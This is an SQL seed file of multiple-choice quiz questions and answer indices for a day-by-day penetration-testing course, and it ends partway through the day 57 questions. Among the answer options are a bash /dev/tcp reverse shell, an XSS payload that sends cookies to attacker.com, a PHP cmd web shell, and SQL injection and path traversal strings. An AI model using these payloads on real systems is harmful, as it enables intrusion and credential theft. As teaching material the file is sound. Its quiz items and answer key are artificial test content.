-- HackPath — Quiz Questions (3 per day = 360 total)
-- All questions are real cybersecurity knowledge checks

-- ================================================================
-- DAYS 1-20 QUIZZES (Phase 1: Foundations)
-- ================================================================

-- Day 1: How the Internet Works
insert into public.quizzes (day_id, question, options, answer) values
(1, 'Which protocol is responsible for mapping domain names to IP addresses?',
  '["HTTP","DNS","DHCP","ARP"]', 1),
(1, 'What is the default port for HTTPS?',
  '["80","8080","443","22"]', 2),
(1, 'Which layer of the TCP/IP model handles IP addressing and routing?',
  '["Application","Transport","Internet","Network Access"]', 2),

-- Day 2: OSI Model
(2, 'At which OSI layer do ARP poisoning attacks occur?',
  '["Layer 3 — Network","Layer 2 — Data Link","Layer 7 — Application","Layer 4 — Transport"]', 1),
(2, 'SSL/TLS operates between which OSI layers?',
  '["Layers 2 and 3","Layers 5 and 7","Layers 3 and 4","Layers 1 and 2"]', 1),
(2, 'Which OSI layer is responsible for end-to-end error recovery and flow control?',
  '["Layer 3 — Network","Layer 5 — Session","Layer 4 — Transport","Layer 6 — Presentation"]', 2),

-- Day 3: TCP/IP
(3, 'What are the correct steps of the TCP three-way handshake in order?',
  '["SYN, ACK, FIN","SYN, SYN-ACK, ACK","ACK, SYN, FIN","SYN, RST, ACK"]', 1),
(3, 'Which Nmap scan type is considered the stealthiest because it does not complete the TCP handshake?',
  '["-sT (TCP Connect)","--sP (Ping)","--sS (SYN Stealth)","--sU (UDP)"]', 2),
(3, 'What TCP flag combination does an Xmas scan use?',
  '["SYN only","FIN+PSH+URG","SYN+ACK","FIN only"]', 1),

-- Day 4: DNS
(4, 'Which DNS record type maps a hostname to an IPv4 address?',
  '["AAAA","MX","A","CNAME"]', 2),
(4, 'What command attempts a DNS zone transfer from a name server?',
  '["dig axfr @ns1.domain.com domain.com","nslookup -type=SOA domain.com","dnsenum domain.com","whois domain.com"]', 0),
(4, 'Which DNS attack embeds exfiltrated data within DNS query hostnames?',
  '["DNS Spoofing","DNS Cache Poisoning","DNS Tunneling","Zone Transfer"]', 2),

-- Day 5: Subnetting
(5, 'How many usable host addresses does a /24 subnet provide?',
  '["255","256","254","128"]', 2),
(5, 'Which IP range is defined by RFC 1918 as private?',
  '["1.0.0.0/8","172.16.0.0/12","100.0.0.0/8","192.0.0.0/8"]', 1),
(5, 'What is the subnet mask for a /25 network?',
  '["255.255.255.0","255.255.255.128","255.255.255.192","255.255.254.0"]', 1),

-- Day 6: Wireshark
(6, 'Which Wireshark display filter shows only HTTP POST requests?',
  '["http.method == GET","tcp.port == 80","http.request.method == POST","http.post == true"]', 2),
(6, 'Which protocol transmits credentials in cleartext and is visible in Wireshark?',
  '["SSH","SFTP","FTP","HTTPS"]', 2),
(6, 'In Wireshark, what does ''Follow TCP Stream'' allow you to do?',
  '["Export packets to PCAP","Reconnect the TCP session","View the entire conversation between two hosts","Apply a capture filter"]', 2),

-- Day 7: Linux Fundamentals 1
(7, 'Which directory in Linux contains configuration files for system services?',
  '["/bin","/etc","/var","/proc"]', 1),
(7, 'What command shows all running processes including those of other users?',
  '["ps -e","top","ps aux","jobs -l"]', 2),
(7, 'Which command searches for the string "root" within /etc/passwd?',
  '["find /etc/passwd root","cat /etc/passwd | root","grep root /etc/passwd","sed root /etc/passwd"]', 2),

-- Day 8: Linux Permissions
(8, 'Which permission notation means the SUID bit is set on a file?',
  '["rwxrwxrwx","rwsr-xr-x","rwxr-sr-x","rwxrwxrwt"]', 1),
(8, 'What command finds all SUID binaries on a Linux system?',
  '["find / -perm +4000 2>/dev/null","ls -la / | grep s","locate suid","chmod -R 4755 /"]', 0),
(8, 'What does the command ''sudo -l'' reveal during privilege escalation?',
  '["System log files","Scheduled cron jobs","Commands the current user can run as sudo","SUID binaries"]', 2),

-- Day 9: Linux Networking
(9, 'Which file on Linux stores local hostname-to-IP mappings?',
  '["/etc/resolv.conf","/etc/hostname","/etc/hosts","/etc/network"]', 2),
(9, 'What command shows all listening TCP/UDP ports with their associated process IDs?',
  '["netstat -a","ss -tulnp","lsof -p","ifconfig -a"]', 1),
(9, 'On which port does SSH listen by default?',
  '["23","21","25","22"]', 3),

-- Day 10: Bash Scripting
(10, 'Which bash construct reads lines from a file named "users.txt" one at a time?',
  '["for user in users.txt","while read line < users.txt","while read line; do ...; done < users.txt","cat users.txt | for line"]', 2),
(10, 'What does the bash operator "2>/dev/null" accomplish?',
  '["Redirects stdin to /dev/null","Redirects stderr (error messages) to /dev/null","Appends stdout to /dev/null","Creates a file called /dev/null"]', 1),
(10, 'Which command-line tool prints only the first field (column) when columns are colon-separated?',
  '["awk -F: ''{print $1}''","sed -d: $1","cut -d: -f1","grep -c :"]', 2),

-- Day 11: Git for Security
(11, 'Which command searches all git commit history for the string "password"?',
  '["git log --grep password","git log -p | grep password","git search password","git blame password"]', 1),
(11, 'What is the risk of committing a .env file to a public GitHub repository?',
  '["It exposes the .gitignore rules","It reveals environment variables including API keys and passwords","It breaks CI/CD pipelines","It corrupts the repository"]', 1),
(11, 'Which SecLists wordlist collection is essential for web directory brute-forcing?',
  '["RockYou","SecLists by Daniel Miessler","CommonCrawl","Crunch"]', 1),

-- Day 12: Lab Setup
(12, 'Which virtualization software provides a free type-2 hypervisor for running Kali Linux VMs?',
  '["VMware ESXi","VirtualBox","Hyper-V Enterprise","KVM"]', 1),
(12, 'What VM network mode isolates target machines from the internet while allowing communication with Kali?',
  '["NAT","Bridged","Host-Only","Internal Network"]', 2),
(12, 'Which intentionally vulnerable application can be run with Docker for web application testing practice?',
  '["WordPress","DVWA (Damn Vulnerable Web Application)","Metasploitable","Kali Linux"]', 1),

-- Day 13: HTTP Deep Dive
(13, 'Which HTTP method is used to submit form data and typically has a request body?',
  '["GET","DELETE","POST","OPTIONS"]', 2),
(13, 'Which HTTP response code indicates that authentication is required to access a resource?',
  '["403 Forbidden","404 Not Found","401 Unauthorized","500 Internal Server Error"]', 2),
(13, 'Which HTTP security header prevents a page from being loaded in an iframe to prevent clickjacking?',
  '["Content-Security-Policy","X-Frame-Options","Strict-Transport-Security","X-Content-Type-Options"]', 1),

-- Day 14: Web Auth
(14, 'In a JWT, what does changing the algorithm header value to "none" allow an attacker to do?',
  '["Encrypt the payload","Decode the token faster","Bypass signature verification entirely","Access the refresh token"]', 2),
(14, 'Which cookie flag prevents JavaScript from reading a cookie, protecting it from XSS theft?',
  '["Secure","SameSite=Strict","HttpOnly","Path=/"]', 2),
(14, 'What is session fixation?',
  '["Stealing a session cookie with XSS","Setting a known session ID before authentication so you can hijack it after login","Generating a predictable session ID","Extending a session indefinitely"]', 1),

-- Day 15: Cookies, CORS, CSP
(15, 'Which CORS response header must be present for a cross-origin AJAX request to succeed?',
  '["Access-Control-Allow-Methods","Access-Control-Allow-Origin","Access-Control-Max-Age","Cross-Origin-Resource-Policy"]', 1),
(15, 'What does Content-Security-Policy with ''unsafe-inline'' enabled allow?',
  '["External script files from any origin","Inline <script> tags and event handlers — enabling XSS","Unencrypted HTTP resources","Third-party iframes"]', 1),
(15, 'Which SameSite cookie value allows the cookie to be sent on top-level GET navigation but not on cross-site POST?',
  '["Strict","Lax","None","Secure"]', 1),

-- Day 16: Cryptography
(16, 'Which hashing algorithm is considered cryptographically broken and should NOT be used for password storage?',
  '["SHA-256","bcrypt","MD5","Argon2"]', 2),
(16, 'What does AES in ECB mode reveal about identical plaintext blocks?',
  '["Nothing — ECB is the most secure AES mode","They produce identical ciphertext blocks, revealing patterns","The encryption key length","The block size"]', 1),
(16, 'Which hashcat attack mode performs a dictionary attack with rule-based mutations?',
  '["-a 0 with -r rules","--a 1 (combinator)","--a 3 (brute force)","--a 6 (hybrid)"]', 0),

-- Day 17: CVEs
(17, 'What does CVSS stand for?',
  '["Common Vulnerability Scoring System","Critical Vulnerability Security Standard","Cyber Vulnerability Security Score","Common Vulnerability and Security Standard"]', 0),
(17, 'Which CVE identifier corresponds to the EternalBlue vulnerability (SMBv1 RCE) used in WannaCry?',
  '["CVE-2014-0160","CVE-2021-44228","CVE-2017-0144","CVE-2021-34527"]', 2),
(17, 'Which command-line tool searches the local Exploit-DB database for exploits matching a service name?',
  '["searchsploit","exploitsearch","metasploit search","nmap --script exploit"]', 0),

-- Day 18: Metasploit
(18, 'In Metasploit, which command lists the required and optional settings for a loaded module?',
  '["info","show options","set options","list params"]', 1),
(18, 'Which Metasploit payload type maintains an active session and provides advanced post-exploitation capabilities?',
  '["windows/shell/reverse_tcp","linux/x64/exec","generic/custom","windows/x64/meterpreter/reverse_tcp"]', 3),
(18, 'What does the Metasploit command ''getsystem'' attempt to do within a Meterpreter session?',
  '["Dump system information","Escalate privileges to SYSTEM or root","List system processes","Connect to a remote system"]', 1),

-- Day 19: Networking Tools
(19, 'Which netcat command sets up a listener on port 4444?',
  '["nc -connect 4444","nc -lvnp 4444","nc -send 4444","nc -open 4444"]', 1),
(19, 'What curl option adds a custom HTTP header to a request?',
  '["-d","--header (-H)","--cookie","--agent"]', 1),
(19, 'Which command performs a reverse DNS lookup on IP address 8.8.8.8?',
  '["dig 8.8.8.8 PTR","nslookup -reverse 8.8.8.8","dig -x 8.8.8.8","host -r 8.8.8.8"]', 2),

-- Day 20: Phase 1 Review
(20, 'Which OverTheWire wargame teaches Linux command-line skills through progressive challenges using SSH?',
  '["Natas","Leviathan","Bandit","Behemoth"]', 2),
(20, 'What is the primary purpose of the /proc/self/environ file in Linux LFI attacks?',
  '["Stores user passwords","Contains running process environment variables including HTTP headers","Lists all running processes","Stores kernel module information"]', 1),
(20, 'Which network protocol uses UDP port 53 for queries and TCP port 53 for zone transfers?',
  '["DHCP","DNS","SNMP","NTP"]', 1),

-- ================================================================
-- DAYS 21-40 QUIZZES (Phase 2: Reconnaissance)
-- ================================================================
(21, 'What is the key difference between passive and active reconnaissance?',
  '["Passive uses automated tools; active is manual","Passive avoids direct contact with the target; active directly interacts","Passive only works on public targets; active requires VPN","Passive is illegal; active is authorized"]', 1),
(21, 'Which OSINT tool aggregates data from social media, domains, and email addresses in a graphical format?',
  '["theHarvester","Maltego","Recon-ng","Shodan"]', 1),
(21, 'What does the Wayback Machine allow security testers to find?',
  '["Live web application vulnerabilities","Historical snapshots of websites revealing old endpoints and files","Employee social media profiles","Open S3 buckets"]', 1),

(22, 'Which Google dork operator restricts search results to a specific domain?',
  '["domain:","host:","site:","insite:"]', 2),
(22, 'What is the purpose of using "filetype:sql" in a Google dork?',
  '["Find all web pages with SQL errors","Search for exposed SQL database dump files indexed by Google","Test for SQL injection vulnerability","Find websites using SQL databases"]', 1),
(22, 'Where is the Google Hacking Database (GHDB) maintained?',
  '["Shodan.io","exploit-db.com/google-hacking-database","Google.com/dorking","Security.org/ghdb"]', 1),

(23, 'What makes Shodan different from standard search engines like Google?',
  '["It only indexes .gov and .edu sites","It crawls internet-connected devices and indexes their service banners","It requires paid subscription for all searches","It focuses on social media content"]', 1),
(23, 'Which Shodan search filter finds all hosts exposing a specific port?',
  '["service:","open:","port:","expose:"]', 2),
(23, 'A Shodan search reveals MongoDB running on port 27017 with no authentication. What is the significance?',
  '["Normal MongoDB configuration","The database is publicly accessible and may contain sensitive data","MongoDB always runs unauthenticated by design","Port 27017 is a honeypot"]', 1),

(24, 'What does a successful DNS zone transfer reveal to an attacker?',
  '["Only the A records for the domain","All DNS records including internal hostnames, potentially revealing the entire network structure","The domain registrar login credentials","Only the MX records for email routing"]', 1),
(24, 'Which DNS record type is used for email server discovery?',
  '["A","CNAME","MX","TXT"]', 2),
(24, 'Certificate Transparency logs (crt.sh) are primarily used during recon to find what?',
  '["Open ports on web servers","TLS/SSL certificates that reveal subdomain names","Password hashes from websites","SQL injection vulnerabilities"]', 1),

(25, 'What is a subdomain takeover vulnerability?',
  '["Hijacking the main domain DNS","Claiming a subdomain that has a CNAME record pointing to an unclaimed/expired service","Performing a DNS cache poisoning attack","Intercepting subdomain traffic via ARP"]', 1),
(25, 'Which tool performs both passive and active subdomain enumeration and is considered the most comprehensive?',
  '["Gobuster","Sublist3r","Amass","dnsrecon"]', 2),
(25, 'Why are subdomains like ''dev.'' or ''staging.'' valuable attack targets?',
  '["They are always vulnerable to SQL injection","They often run older software, have debug modes enabled, or have weaker security than production","They are excluded from SSL certificates","They only serve internal traffic"]', 1),

(26, 'Which online tool is used to identify employee email formats (e.g., first.last@company.com) for a target organization?',
  '["Shodan","Hunter.io","Google Dorks","LinkedIn Sales Navigator"]', 1),
(26, 'What critical security risk exists when employees use the same password found in a breach database for corporate accounts?',
  '["Password fatigue","Credential stuffing attack success","Brute force vulnerability","Phishing susceptibility"]', 1),
(26, 'Which command-line tool aggregates OSINT from multiple sources including search engines and LinkedIn?',
  '["theHarvester","Maltego","Recon-ng","SpiderFoot"]', 0),

(27, 'What information does an ASN (Autonomous System Number) reveal during network reconnaissance?',
  '["Individual host vulnerabilities","All IP address ranges owned by an organization","Employee email addresses","Website technology stack"]', 1),
(27, 'Which Shodan feature allows searching for hosts vulnerable to a specific CVE?',
  '["vuln: filter","cve: filter","exploit: filter","patch: filter"]', 0),
(27, 'What does a TXT DNS record containing "v=spf1 include:_spf.google.com" reveal?',
  '["The site uses Google Analytics","The organization uses Google Workspace for email","The website is hosted on Google Cloud","The domain uses Google reCAPTCHA"]', 1),

(28, 'Which Nmap flag performs service version detection?',
  '["-O","-sV","-sC","-A"]', 1),
(28, 'What is the difference between Nmap -T4 and -T5 timing options?',
  '["-T4 is more accurate, -T5 may miss open ports due to speed","-T5 is slower and stealthier","-T4 uses UDP only, -T5 uses TCP","-T4 is for IPv4 only"]', 0),
(28, 'Which Nmap scan type is most appropriate when you do NOT have root/administrator privileges?',
  '["-sS (SYN scan)","-sT (TCP connect scan)","-sU (UDP scan)","-sF (FIN scan)"]', 1),

(29, 'Which NSE script category checks for common vulnerabilities without causing crashes or disruption?',
  '["intrusive","exploit","vuln","brute"]', 2),
(29, 'What does the Nmap script "smb-vuln-ms17-010" check for?',
  '["SMB anonymous authentication","The EternalBlue vulnerability (WannaCry vector) in SMBv1","Default SMB credentials","SMB version detection"]', 1),
(29, 'Which NSE script category should be avoided on production systems without explicit authorization due to risk of service disruption?',
  '["safe","discovery","default","intrusive"]', 3),

(30, 'Which tool performs comprehensive Windows/Samba SMB enumeration including users, shares, and password policy?',
  '["nmap","smbclient","enum4linux","netcat"]', 2),
(30, 'What information does SNMP (port 161/UDP) with the default community string "public" potentially expose?',
  '["Only network interface information","Running processes, installed software, network configuration, and local user accounts","Encrypted password hashes","Firewall rules only"]', 1),
(30, 'Which SMTP command can be used to verify if a username exists on a mail server?',
  '["HELO","RCPT TO","VRFY","MAIL FROM"]', 2),

-- Days 31-40 quizzes
(31, 'What does WhatWeb identify when run against a target website?',
  '["Open ports and services","CMS type, framework, server software, and technologies used","Employee email addresses","SQL injection vulnerabilities"]', 1),
(31, 'Which file should always be checked first on a web server for reconnaissance because it reveals paths the admin wants hidden?',
  '["/sitemap.xml","/index.html","/robots.txt","/.htaccess"]', 2),
(31, 'What is the purpose of running linkfinder against JavaScript files?',
  '["Find XSS vulnerabilities in JavaScript","Discover API endpoints and paths hidden within JavaScript code","Test JavaScript for prototype pollution","Analyze JavaScript for malware"]', 1),

(32, 'What is a false positive in vulnerability scanning?',
  '["A real vulnerability that was not detected","A reported vulnerability that does not actually exist","A critical vulnerability misclassified as low","A vulnerability in a test environment"]', 1),
(32, 'Which open-source tool uses templates (YAML files) to detect vulnerabilities rapidly across many targets?',
  '["Nessus","OpenVAS","Nuclei","Nikto"]', 2),
(32, 'What does Nikto check that many other scanners miss?',
  '["SQL injection vulnerabilities","Dangerous files, outdated software, and missing security headers on web servers","Active Directory misconfigurations","Firewall rule weaknesses"]', 1),

(33, 'Which version of SMB is associated with the EternalBlue vulnerability exploited by WannaCry ransomware?',
  '["SMBv2","SMBv3","SMBv1","SMB over QUIC"]', 2),
(33, 'What does CrackMapExec''s "--sam" flag do when executed with valid credentials?',
  '["Checks if SAM file exists","Dumps local account password hashes from the SAM database","Scans for SAM misconfigurations","Lists SAM group memberships"]', 1),
(33, 'What is Kerberoasting?',
  '["A DoS attack against Kerberos","Requesting service tickets for SPN accounts and cracking them offline","Forging Kerberos tickets using stolen keys","Exploiting Kerberos pre-authentication failure"]', 1),

(34, 'In FFUF, which flag filters out responses by size to remove noise (e.g., default 404 responses)?',
  '["-mc (match code)","-fs (filter size)","-fw (filter words)","-fl (filter lines)"]', 1),
(34, 'Which wordlist in SecLists is commonly used for web directory discovery and contains common web paths?',
  '["rockyou.txt","n0kovo_subdomains.txt","common.txt","passwords.txt"]', 2),
(34, 'What does virtual host (vhost) fuzzing attempt to discover?',
  '["Hidden directories on the web server","Multiple websites hosted on the same IP address via different Host headers","SQL injection in HTTP headers","Subdomains registered in DNS"]', 1),

(35, 'What is the primary purpose of Recon-ng''s workspace feature?',
  '["Store credentials for reuse","Isolate data from different engagements to prevent mixing","Speed up reconnaissance scans","Enable parallel scanning"]', 1),
(35, 'Which theHarvester data source specifically collects employee information from professional networks?',
  '["Google","Bing","LinkedIn","Shodan"]', 2),
(35, 'What type of OSINT does Certificate Transparency log searching provide?',
  '["Network topology information","Historical subdomain names from SSL certificates issued for a domain","Employee email addresses","Technology stack details"]', 1),

(36, 'What does enabling monitor mode on a wireless adapter allow?',
  '["Increase WiFi signal strength","Capture all wireless frames in the air, not just those addressed to you","Connect to hidden SSIDs","Bypass WPA2 encryption"]', 1),
(36, 'Which tool is used to deauthenticate clients from a wireless access point to capture the WPA2 handshake?',
  '["airodump-ng","aireplay-ng","aircrack-ng","airmon-ng"]', 1),
(36, 'What type of attack creates a fake access point with the same SSID as a legitimate one to intercept connections?',
  '["WPS attack","Evil Twin attack","ARP poisoning","Karma attack"]', 1),

(37, 'Which AWS service URL path is targeted in SSRF attacks to steal IAM credentials?',
  '["http://aws.internal/credentials","http://169.254.169.254/latest/meta-data/iam/security-credentials/","http://metadata.aws.com/iam/","http://10.0.0.1/aws/credentials"]', 1),
(37, 'What makes a public S3 bucket a security vulnerability?',
  '["S3 buckets are always encrypted","Anyone on the internet can list and download files stored in it","S3 is incompatible with standard HTTP access","Public buckets always contain malware"]', 1),
(37, 'Which tool performs multi-cloud enumeration checking AWS S3, Azure Blob, and GCP Storage simultaneously?',
  '["Pacu","Scout Suite","CloudEnum","cloudmapper"]', 2),

(38, 'What does the acronym PTES stand for in penetration testing?',
  '["Penetration Testing Execution Standard","Professional Technical Engagement Standard","Pentest Technical Entry System","Professional Tester Evaluation Standard"]', 0),
(38, 'At which phase of a penetration test does the tester attempt to access systems and data?',
  '["Reconnaissance","Vulnerability Assessment","Exploitation","Reporting"]', 2),
(38, 'What document must be signed before a penetration test begins to protect both the tester and client legally?',
  '["Non-Disclosure Agreement (NDA) only","Penetration Testing Scope and Rules of Engagement document with authorization","Security Clearance certificate","Bug bounty terms of service"]', 1),

(39, 'What does ''httpx'' do when given a list of subdomains?',
  '["Enumerates HTTP parameters","Probes subdomains for live HTTP/HTTPS services","Scans for XSS vulnerabilities","Brute-forces directory paths"]', 1),
(39, 'Which Arjun tool feature makes it valuable for bug bounty hunting?',
  '["It brute-forces login pages","It discovers hidden GET/POST parameters that are not visible in the front-end","It decompiles mobile apps","It performs network packet capture"]', 1),
(39, 'Why is JavaScript file analysis important in bug bounty reconnaissance?',
  '["JavaScript files contain database credentials","JS files often reveal hidden API endpoints, internal paths, and hardcoded secrets","JavaScript is vulnerable to XSS by default","JS analysis bypasses WAF rules"]', 1),

(40, 'Which TryHackMe learning path is specifically designed to prepare for the OSCP certification?',
  '["Pre-Security","Jr Penetration Tester","Offensive Pentesting","SOC Level 1"]', 2),
(40, 'What is the significance of GitHub dorks like ''site:github.com "target.com" password''?',
  '["They find GitHub repository vulnerabilities","They search for accidentally committed credentials or configuration files mentioning the target","They enumerate GitHub Actions workflows","They find GitHub Pages vulnerabilities"]', 1),
(40, 'During recon, you find that dev.target.com CNAME points to abandoned-project.netlify.app and returns a 404. What vulnerability is present?',
  '["DNS Cache Poisoning","DNS Zone Transfer","Subdomain Takeover — the Netlify app can be claimed","DNS Hijacking"]', 2),

-- ================================================================
-- DAYS 41-60 QUIZZES (Phase 3: Exploitation)
-- ================================================================
(41, 'Which Metasploit command searches for all exploit modules related to EternalBlue?',
  '["search ms17-010 type:exploit","find eternalblue","list exploits smb","grep eternalblue modules"]', 0),
(41, 'What does ''set LHOST tun0'' configure in Metasploit?',
  '["The target host IP","The local host IP using the tun0 VPN interface for the reverse connection","The listening port","The payload encoder"]', 1),
(41, 'Which msfvenom flag specifies bad characters to exclude from the generated shellcode?',
  '["-e (encoder)","-b (bad characters)","-x (template)","-i (iterations)"]', 1),

(42, 'Which one-liner creates a reverse bash shell connecting to 10.0.0.1 on port 4444?',
  '["nc -e /bin/bash 10.0.0.1 4444","bash -i >& /dev/tcp/10.0.0.1/4444 0>&1","bash --reverse 10.0.0.1:4444","socat bash tcp:10.0.0.1:4444"]', 1),
(42, 'What does shell stabilization with ''python3 -c "import pty;pty.spawn(''/bin/bash'')"'' provide?',
  '["A root shell","A more interactive, properly functional TTY shell with job control","An encrypted connection","A Meterpreter-like interface"]', 1),
(42, 'What is the difference between a bind shell and a reverse shell?',
  '["Bind shells are encrypted; reverse shells are not","In a bind shell, the target listens on a port for the attacker to connect; in reverse, the target connects back to the attacker","Bind shells require root; reverse shells do not","Bind shells only work on Linux; reverse shells work cross-platform"]', 1),

(43, 'Which Hydra flag specifies using a username list file for brute-forcing?',
  '["-u (username)","-l (single user)","-L (user list file)","-U (user list)"]', 2),
(43, 'What is password spraying and why is it preferred over traditional brute-forcing?',
  '["It uses rainbow tables to crack hashes faster","It tries one password against many users to avoid account lockout thresholds","It sprays payloads to find injection points","It generates passwords based on target OSINT"]', 1),
(43, 'Which CeWL option sets the depth of web crawling when generating a custom wordlist?',
  '["-m (minimum length)","-w (output file)","-d (depth)","-e (extract emails)"]', 2),

(44, 'What Hashcat mode number is used to crack NTLM hashes?',
  '["0","1000","1800","3200"]', 1),
(44, 'Which command using John the Ripper first extracts hash information from /etc/shadow and combines it with /etc/passwd?',
  '["john /etc/shadow --wordlist=rockyou.txt","unshadow /etc/passwd /etc/shadow > combined.txt","john --format=sha512crypt /etc/shadow","shadow2john /etc/shadow"]', 1),
(44, 'What does a hashcat mask of ''?u?l?l?l?d?d?d?s'' represent?',
  '["8 lowercase letters","Uppercase + 3 lowercase + 3 digits + 1 special (like Password1!)","7 mixed alphanumeric characters","All printable ASCII characters"]', 1),

(45, 'Which SQL injection payload is used for time-based blind injection in MySQL?',
  '["'' OR SLEEP(5)-- -","'' WAITFOR DELAY ''0:0:5''-- -","'' OR 1=1-- -","'' UNION SELECT NULL-- -"]', 0),
(45, 'In a UNION-based SQL injection, what must match between the original query and the injected UNION SELECT?',
  '["The table names","The number of columns and their data types","The WHERE clause conditions","The ORDER BY fields"]', 1),
(45, 'Which SQL injection technique does NOT display data directly but infers information from the application''s behavior?',
  '["UNION-based","Error-based","Boolean-based Blind","In-band"]', 2),

(46, 'Which SQLMap flag automatically dumps all data from the detected database?',
  '["--dump","--extract-all","--get-data","--harvest"]', 0),
(46, 'What does the SQLMap ''--tamper=space2comment'' script do?',
  '["Adds SQL comments as payloads","Replaces spaces with /**/ to bypass WAF keyword filters","Encodes payloads in base64","Randomizes letter case in SQL keywords"]', 1),
(46, 'Which SQLMap option saves a raw Burp Suite request to use as the target?',
  '["-u (URL flag)","-r request.txt","-b (banner grab)","--burp-log"]', 1),

(47, 'Which XSS payload type is most dangerous because it persists in the database and affects all users who view the page?',
  '["Reflected XSS","DOM-based XSS","Stored (Persistent) XSS","Self-XSS"]', 2),
(47, 'What is the purpose of the XSS payload: <script>new Image().src=''http://attacker.com/?c=''+document.cookie;</script>?',
  '["Test if XSS is reflected","Steal the victim''s cookies and send them to the attacker","Redirect the victim to a phishing page","Overwrite the page content"]', 1),
(47, 'Which XSS vector does NOT use angle brackets and is useful when HTML tags are filtered?',
  '["<script>alert(1)</script>","<img src=x onerror=alert(1)>","\" onmouseover=alert(1) foo=\"","<svg onload=alert(1)>"]', 2),

(48, 'Which PHP web shell payload executes OS commands passed through a GET parameter named ''cmd''?',
  '["<?php include($_GET[''cmd'']); ?>","<?php system($_GET[''cmd'']); ?>","<?php echo $_GET[''cmd'']; ?>","<?php file_get_contents($_GET[''cmd'']); ?>"]', 1),
(48, 'What technique allows a PHP file extension bypass when the server blacklists ''.php'' but not all variants?',
  '["Use .html instead","Try alternative extensions like .php5, .phtml, .phar","Rename to .jpg.php","Use double URL encoding"]', 1),
(48, 'What is PHP log poisoning and what vulnerability does it combine with?',
  '["Injecting PHP code into Apache logs via User-Agent, then executing it through Local File Inclusion (LFI)","Corrupting PHP error logs to cause a DoS","Injecting PHP code via SQL injection","Poisoning PHP session files to escalate privileges"]', 0),

(49, 'Which command injection separator executes the second command ONLY if the first succeeds?',
  '[";","||","&&","|"]', 2),
(49, 'How does the bash expression ${IFS} help bypass command injection filters?',
  '["It encodes the command in base64","It provides an alternative to spaces when space characters are filtered","It creates a subshell to hide command execution","It redirects stderr to the command output"]', 1),
(49, 'Which type of command injection produces no visible output in the response, requiring out-of-band techniques?',
  '["Reflected injection","In-band injection","Blind injection","Error-based injection"]', 2),

(50, 'Which Linux path traversal payload uses URL encoding to bypass a filter that blocks '../''?',
  '["..\\..\\etc\\passwd","%2e%2e%2f%2e%2e%2fetc%2fpasswd","....//....//etc/passwd","%%2e%%2e/etc/passwd"]', 1),
(50, 'What PHP wrapper allows reading PHP source code as base64 instead of executing it?',
  '["php://input","data://text/plain","php://filter/convert.base64-encode/resource=","file:///"]', 2),
(50, 'Which high-value file on Linux contains the hashed passwords for local user accounts?',
  '["/etc/passwd","/proc/version","/etc/shadow","/var/log/auth.log"]', 2),

-- Days 51-60
(51, 'What is the purpose of the EIP register in x86 buffer overflow exploitation?',
  '["Extended Instruction Pointer — controls the next instruction the CPU will execute","Extended Index Pointer — points to current stack frame","Error Instruction Pointer — flags exceptions","External Interface Pointer — manages I/O"]', 0),
(51, 'Which Metasploit tool generates a cyclic pattern to determine the exact offset to EIP?',
  '["msfvenom -p pattern","msf-pattern_create","msfconsole pattern generate","msf-generate"]', 1),
(51, 'What is the role of NOPsled (\x90 bytes) in a buffer overflow exploit?',
  '["Replace the return address","Provide a landing zone before shellcode to compensate for slight address variations","Eliminate bad characters from the payload","Encode the shellcode to avoid detection"]', 1),

(52, 'In buffer overflow exploitation, what does a JMP ESP instruction accomplish?',
  '["Jumps to the top of the stack","Redirects execution from EIP to the top of the stack where shellcode is placed","Ends the current function call","Allocates stack space for shellcode"]', 1),
(52, 'Which Immunity Debugger plugin is used to find JMP ESP instructions and bad characters in buffer overflow development?',
  '["pwndbg","mona.py","peda","gef"]', 1),
(52, 'What does the ''EXITFUNC=thread'' msfvenom option do in shellcode generation?',
  '["Makes the shellcode self-contained","Exits only the current thread rather than the whole process, maintaining application stability","Encrypts the exit function","Prevents detection by antivirus"]', 1),

(53, 'Which Linux privilege escalation technique exploits a script that runs as root via cron but is writable by the attacker?',
  '["SUID exploitation","Sudo misconfiguration","Cron job hijacking","Library path hijacking"]', 2),
(53, 'What does GTFOBins provide for penetration testers?',
  '["A list of all CVEs for Linux","Methods to exploit Unix binaries (SUID, sudo, cron) to bypass restrictions and gain shells","Linux kernel exploit source code","Wordlists for password cracking"]', 1),
(53, 'What Linux file, if world-writable, allows an attacker to add a new root user by appending a crafted line?',
  '["/etc/shadow","/etc/group","/etc/passwd","/etc/sudoers"]', 2),

(54, 'What Windows privilege allows token impersonation attacks like JuicyPotato and PrintSpoofer?',
  '["SeDebugPrivilege","SeBackupPrivilege","SeImpersonatePrivilege","SeTakeOwnershipPrivilege"]', 2),
(54, 'Which Windows registry path is checked to detect the AlwaysInstallElevated privilege escalation vector?',
  '["HKLM\\System\\CurrentControlSet\\Services","HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer AlwaysInstallElevated","HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon","HKCU\\Software\\Classes\\exefile"]', 1),
(54, 'What is an unquoted service path vulnerability in Windows?',
  '["A service path stored without encryption","A service binary path with spaces but no quotes, allowing execution of an attacker-placed binary at a preceding path segment","A service running with a null password","A service using a relative path instead of absolute"]', 1),

(55, 'Which vulnerability in Apache HTTP Server 2.4.49 allowed path traversal and remote code execution?',
  '["CVE-2021-44228","CVE-2021-41773","CVE-2017-0144","CVE-2014-6271"]', 1),
(55, 'ShellShock (CVE-2014-6271) exploits a vulnerability in which Linux component?',
  '["The Linux kernel","The OpenSSL library","The Bash shell","The Apache web server"]', 2),
(55, 'What is the Metasploit module path for exploiting EternalBlue on Windows?',
  '["exploit/windows/smb/eternalblue","exploit/windows/smb/ms17_010_eternalblue","exploit/multi/smb/eternal_blue","auxiliary/scanner/smb/eternalblue"]', 1),

(56, 'Which web shell tool generates PHP agents with obfuscation and provides a feature-rich command interface?',
  '["Laudanum","Weevely","b374k","p0wny-shell"]', 1),
(56, 'What ASP.NET extension allows server-side code execution on IIS web servers?',
  '[".php",".jsp",".aspx",".cfm"]', 2),
(56, 'Why should web shells be stored in deep directory paths with non-obvious names?',
  '["Web servers only execute files in root directories","To reduce detection by security teams and web application firewalls performing signature-based scanning","To improve execution speed","Web shells require special directory permissions"]', 1),

(57, 'Which impacket tool executes commands on a remote Windows host via SMB without leaving a service binary?',
  '["psexec.py","smbexec.py","wmiexec.py","atexec.py"]', 2),
(57, 'What does CrackMapExec''s ''-x'' flag do?',
  '["Execute a PowerShell command","Execute a cmd.exe command","Extract credentials","Set the domain controller target"]', 1),
(57, 'What is the primary advantage of impacket''s GetUserSPNs.py during a penetration test?',
